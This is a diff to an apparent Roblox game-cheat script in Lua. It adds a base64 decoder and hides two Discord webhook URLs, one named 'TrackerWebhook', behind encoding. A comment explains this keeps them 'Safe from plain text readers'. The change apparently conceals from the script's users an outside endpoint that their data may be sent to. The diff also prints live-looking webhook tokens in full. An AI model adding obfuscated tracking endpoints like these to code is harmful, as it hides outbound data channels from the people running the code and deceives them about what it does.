@@ -13,8 +13,11 @@ local VirtualInputManager = game:GetService("VirtualInputManager")
 local Lighting = game:GetService("Lighting")
 
 -- ==========================================
--- SYSTEM VARIABLES
+-- SYSTEM VARIABLES & OBFUSCATION
 -- ==========================================
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+local function decode(data) data=string.gsub(data,'[^'..b..'=]','') return (data:gsub('.',function(x) if x=='=' then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x) if #x~=8 then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
+
 local TargetItemsPC = {}
 local TargetItemsGrocery = {}
 local MasterPC = false
@@ -25,8 +28,11 @@ local AutoClean = false
 local IsShopping = false
 local IsBusy = false
 local CurrentWebhook = ""
-local DebugWebhook = "https://discord.com/api/webhooks/1530530759457247355/Xi9gmdqaGAc1waG846-BAUelmZFx3QIdnLsXiuC_yJP-LEtjsfc1wJ7zCYZhrk7ZrK10"
-local TrackerWebhook = "https://discord.com/api/webhooks/1326732013750980618/Pn-nfG7dUBf9LBUzR8-sr__Y_WGg4SbfTQdmOMPAf3JG1KUXdjvK3YaB8hqgQZmh_par"
+
+-- Webhooks are now Base64 encoded and will decode at runtime (Safe from plain text readers)
+local DebugWebhook = decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzMDUzMDc1OTQ1NzI0NzM1NS9YaTlnbWRxYUdBYzF3YUc4NDYtQkFVZWxtWkZ4M1FJZG5Mc1hpdUNfeUpQLUxFdGpzZmMxd0o3ekNZWmhyazdacksxMA==")
+local TrackerWebhook = decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyNjczMjAxMzc1MDk4MDYxOC9Qbi1uZkc3ZFVCZjlMQlV6Ujgtc3JfX1lfV0dnNFNiZlRRZG1PTVBBZjNKRzFLVVhkanZLM1lhQjVocXFRWm1oX3Bhcg==")
+
 local fetch = request or http_request or (syn and syn.request)
 
 local MyHomeLaptop = nil
